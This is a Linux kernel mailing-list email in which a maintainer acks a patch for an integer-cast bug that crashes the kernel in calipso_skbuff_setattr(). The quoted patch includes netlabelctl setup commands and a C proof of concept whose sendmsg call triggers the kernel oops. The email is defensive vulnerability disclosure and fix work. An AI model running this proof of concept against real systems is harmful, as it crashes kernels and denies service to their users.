Received: from mail-pj1-f50.google.com (mail-pj1-f50.google.com [209.85.216.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 628FE339B41
	for <linux-security-module@vger.kernel.org>; Fri, 19 Dec 2025 18:11:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1766167900; cv=none; b=MzZGm8R6DllaTw+vBbd4f2Zfv1L3xKcKpQSiuGLyfExeCYMKu2FbWIjCq4CUgbjoU6Y2GJOCktqi072/s8JdjDGP1v4YDixlprCZxFgUtMzmJFTkLcEH65jLexv1zQHOhToMCJEYzmaApEYXymlsvJlmd6oBXiCvmgZ/MTc7+Xo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1766167900; c=relaxed/simple;
	bh=XNVLrwpsXPHzXFeydYjN1QOG9WtOH5XaaQ/9OFUM3QI=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=EAPmRAXq28OjA90btXHrI+odA/f9OpA0cpLc0ZDxKyxfxpzp7FZKg1H9bSOXddJXPFpa5MepWoIvNXBK5HQW794JJnWgfs5jpAGZq6Bq45yWiZoAn2HcnIUKutYxk7CRQkiUHKkXTWat1+9wAeWbooSnZg7cQaZuoAAqj+qUgMQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=paul-moore.com; spf=pass smtp.mailfrom=paul-moore.com; dkim=pass (2048-bit key) header.d=paul-moore.com header.i=@paul-moore.com header.b=fhy/uWJQ; arc=none smtp.client-ip=209.85.216.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=paul-moore.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=paul-moore.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=paul-moore.com header.i=@paul-moore.com header.b="fhy/uWJQ"
Received: by mail-pj1-f50.google.com with SMTP id 98e67ed59e1d1-34c565b888dso2304019a91.0
        for <linux-security-module@vger.kernel.org>; Fri, 19 Dec 2025 10:11:38 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=paul-moore.com; s=google; t=1766167898; x=1766772698; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=XKmnc8sQT0m90A1EGL7X+BZsX0x2H9PAUpCfvRKuOns=;
        b=fhy/uWJQEnwuHQK6GrBszkZiA30aSElJt4WuGgay6/vCXQHpS43BCl7VGEAM+DgD5v
         tVrQCPwxA4QywSn5EBktu3hpNyVj18/tWZs4eIV/oP4jNl4Dil0LAGNPwUOuimfOKS8/
         YlMuQbtZ/89xVhBc0/MwMJO+QbH9qc41SKelNsjwQM7wJ2EC2fkegLJcCIMc/aJlMEKc
         gG5atqaySJG3DyUzuDGzwhXeQjee1Up2DVfo/n9aIYcCiho60r3Gl3n8SM0AHsUiXbb6
         TBCV5tWDeprdYU7G2NuLrmLIux39MtHlmreBZFB6pN807X62xlEuAQI6f1Rvl9qfNd8y
         yk/A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1766167898; x=1766772698;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=XKmnc8sQT0m90A1EGL7X+BZsX0x2H9PAUpCfvRKuOns=;
        b=mvbVjsEeXbQxrUqN9z9wDxswwPPnY5oiyJ6xFUJNcqQ+8WSwv0RTS8SgQsq3UOyNgF
         YqBf54KPPbFglMB9akq/b0fIkWKgj36x528Jc/X6TKf3sZuZWen0rUZXRrH6sxbl2/d0
         x96d/kF/04wSbOMcJezyP+Jxxdrw5w9epYDklYdQkm9GWyB5CclQW6DNeyYKTitsMkgW
         AeFgGlJ1pFK61CWePfBnjVEfPMNdK3/IdwTZLyI0zhfYprf/AkU1Gb0ApKXOl9sjgC82
         +3z4+3grH/H9Cyxy3vxLo5TRn+q17rkRR6m3jWWk6lBR54r37sRqoarGzFBUvFNvFj3P
         efwQ==
X-Forwarded-Encrypted: i=1; AJvYcCUPaSOpYQswn4H5dwMOkDBtG8CI6fjgknQurO2OY0E4b+JggQQFGuktcYvZQR2BoRbkzqBxCP1ju0GgTYCvKC0mfwmMywM=@vger.kernel.org
X-Gm-Message-State: AOJu0Yx+R5VDRyg2B1bae6n/uWAaNI9YkqCtpFanSCUl6F3pKd8U/QCd
	PJruKKag2hbvKwiErSFPT2vi5U6fSBJd4WJCY2NV/HPaUoArLlGBgM61w47nf5xKKDoGEERoAmS
	8qwqpWPxjT4sKTyOV7ADdVFkRfp0cQikJWN0zU4k9
X-Gm-Gg: AY/fxX5gNQYDY4UgQ4v7B5i7v1C67GIwCJU75mP1slaaYHqaPA484ZSjCJoEOXXgn56
	Zmj+iy8aKrgl1kW8whRnI9HO4OmlNtbQl+hRuWpuRJBOr9kTK8uL1v/N0nNaYRzYSt0f4QjT055
	mSbUpLr+MVCtP2RM2qFtjY8oq+bc5p+/Dg+3Ufr6LtkS+WXnEHKOuqkyh2L/RU1mnSreWKdqmlA
	ASGvDLcu1tS6AgdgXh3XftDL6BDX2FqCzI68b2cmLldDSP/mkEdD8WwIHXJxIWDL7Y7e7g=
X-Google-Smtp-Source: AGHT+IF0rXHFwu13e8zRdTaDEgLFU70atv3Zw0sMr2VMnWLKs7QsHVB9ThIJkD6W/Hmqc3AjQdBCoUbBbHebtBzaA7w=
X-Received: by 2002:a17:90b:35d2:b0:340:776d:f4ca with SMTP id
 98e67ed59e1d1-34e921e057cmr3557162a91.26.1766167897674; Fri, 19 Dec 2025
 10:11:37 -0800 (PST)
Precedence: bulk
X-Mailing-List: linux-security-module@vger.kernel.org
List-Id: <linux-security-module.vger.kernel.org>
List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20251219173637.797418-1-whrosenb@asu.edu>
In-Reply-To: <20251219173637.797418-1-whrosenb@asu.edu>
From: Paul Moore <paul@paul-moore.com>
Date: Fri, 19 Dec 2025 13:11:26 -0500
X-Gm-Features: AQt7F2r673eNS1MvXH_LmuvBf0t193_GTzqos_6szr64npgBWaYAbu_wr6q-mvo
Message-ID: <CAHC9VhQmR8A2vz0W-VrrhYNQ2wgCYxHbAmdgmM2yTL-uh4qiOg@mail.gmail.com>
Subject: Re: [PATCH] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
To: Will Rosenberg <whrosenb@asu.edu>
Cc: security@kernel.org, "David S. Miller" <davem@davemloft.net>, 
	David Ahern <dsahern@kernel.org>, Eric Dumazet <edumazet@google.com>, 
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, 
	Huw Davies <huw@codeweavers.com>, netdev@vger.kernel.org, 
	linux-security-module@vger.kernel.org, linux-kernel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Fri, Dec 19, 2025 at 12:37=E2=80=AFPM Will Rosenberg <whrosenb@asu.edu> =
wrote:
>
> There exists a kernel oops caused by a BUG_ON(nhead < 0) at
> net/core/skbuff.c:2232 in pskb_expand_head().
> This bug is triggered as part of the calipso_skbuff_setattr()
> routine when skb_cow() is passed headroom > INT_MAX
> (i.e. (int)(skb_headroom(skb) + len_delta) < 0).
>
> The root cause of the bug is due to an implicit integer cast in
> __skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
> that delta =3D headroom - skb_headroom(skb) is never negative, otherwise
> we will trigger a BUG_ON in pskb_expand_head(). However, if
> headroom > INT_MAX and delta <=3D -NET_SKB_PAD, the check passes, delta
> becomes negative, and pskb_expand_head() is passed a negative value for
> nhead.
>
> Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
> "negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
> by only using skb_cow() to grow headroom.
>
> PoC:
>         Using `netlabelctl` tool:
>
>         netlabelctl map del default
>         netlabelctl calipso add pass doi:7
>         netlabelctl map add default address:0::1/128 protocol:calipso,7
>
>         Then run the following PoC:
>
>         int fd =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
>
>         // setup msghdr
>         int cmsg_size =3D 2;
>         int cmsg_len =3D 0x60;
>         struct msghdr msg;
>         struct sockaddr_in6 dest_addr;
>         struct cmsghdr * cmsg =3D (struct cmsghdr *) calloc(1,
>                         sizeof(struct cmsghdr) + cmsg_len);
>         msg.msg_name =3D &dest_addr;
>         msg.msg_namelen =3D sizeof(dest_addr);
>         msg.msg_iov =3D NULL;
>         msg.msg_iovlen =3D 0;
>         msg.msg_control =3D cmsg;
>         msg.msg_controllen =3D cmsg_len;
>         msg.msg_flags =3D 0;
>
>         // setup sockaddr
>         dest_addr.sin6_family =3D AF_INET6;
>         dest_addr.sin6_port =3D htons(31337);
>         dest_addr.sin6_flowinfo =3D htonl(31337);
>         dest_addr.sin6_addr =3D in6addr_loopback;
>         dest_addr.sin6_scope_id =3D 31337;
>
>         // setup cmsghdr
>         cmsg->cmsg_len =3D cmsg_len;
>         cmsg->cmsg_level =3D IPPROTO_IPV6;
>         cmsg->cmsg_type =3D IPV6_HOPOPTS;
>         char * hop_hdr =3D (char *)cmsg + sizeof(struct cmsghdr);
>         hop_hdr[1] =3D 0x9; //set hop size - (0x9 + 1) * 8 =3D 80
>
>         sendmsg(fd, &msg, 0);
>
> Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly=
.")
> Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
> ---
>
> Notes:
>     -Changing __skb_cow() would likely require an audit of all its use
>     cases due to its long legacy in the kernel. After private discussions=
,
>     it was decided that this patch should be applied to calipso to remedy
>     the immediate symptoms and allow for easy backporting. However, net
>     devs should consider remedying the root cause through __skb_cow()
>     and skb_cow().
>
>     -Paul, please let me know if I should add any form of credit for
>     the patch code, such as "Suggested-By."
>
>  net/ipv6/calipso.c | 3 ++-
>  1 file changed, 2 insertions(+), 1 deletion(-)

Folks can add my Suggested-by if they like, but I'm not bothered
either way; getting it fixed upstream is the important part.  Thanks
for your work on this Will!

Acked-by: Paul Moore <paul@paul-moore.com>

> diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
> index df1986973430..21f6ed126253 100644
> --- a/net/ipv6/calipso.c
> +++ b/net/ipv6/calipso.c
> @@ -1342,7 +1342,8 @@ static int calipso_skbuff_setattr(struct sk_buff *s=
kb,
>         /* At this point new_end aligns to 4n, so (new_end & 4) pads to 8=
n */
>         pad =3D ((new_end & 4) + (end & 7)) & 7;
>         len_delta =3D new_end - (int)end + pad;
> -       ret_val =3D skb_cow(skb, skb_headroom(skb) + len_delta);
> +       ret_val =3D skb_cow(skb,
> +                         skb_headroom(skb) + (len_delta > 0 ? len_delta =
: 0));
>         if (ret_val < 0)
>                 return ret_val;
>
>
> base-commit: ea1013c1539270e372fc99854bc6e4d94eaeff66
> --
> 2.34.1

--=20
paul-moore.com
